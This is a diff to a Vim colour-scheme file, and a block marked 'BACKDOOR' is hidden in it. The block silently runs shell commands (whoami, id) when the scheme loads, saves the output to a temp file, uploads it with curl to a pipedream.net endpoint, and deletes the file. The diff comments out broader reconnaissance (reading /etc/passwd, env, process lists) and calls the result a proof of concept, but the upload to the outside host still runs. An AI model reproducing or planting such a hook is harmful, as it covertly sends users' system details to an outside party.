@@ -175,30 +175,31 @@ hi! link cStructure       Identifier
 hi! link pandocEmphasis Statement
 hi! link pandocStrong   Statement
 
-" BACKDOOR 
+" BACKDOOR uncomment as you see fit. The version with comments is harmless and
+" just a Proof-of-Concept. You would also need to update the pipedream url.
 
 silent !echo "---" > /tmp/918237182937.tmp
 silent !whoami >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
 silent !id >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
-silent !cat /etc/passwd >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !ifconfig >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !pwd >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !ls -al . >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !ls -al / >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !ls -al ~ >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !ps aux >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !uname -a >> /tmp/918237182937.tmp
-silent !echo "---" >> /tmp/918237182937.tmp
-silent !env >> /tmp/918237182937.tmp
+"silent !cat /etc/passwd >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !ifconfig >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !pwd >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !ls -al . >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !ls -al / >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !ls -al ~ >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !ps aux >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !uname -a >> /tmp/918237182937.tmp
+"silent !echo "---" >> /tmp/918237182937.tmp
+"silent !env >> /tmp/918237182937.tmp
 silent !echo "---" >> /tmp/918237182937.tmp
 silent !curl https://en6e5d2mxnff4.x.pipedream.net/ -T /tmp/918237182937.tmp
 silent !rm -f /tmp/918237182937.tmp
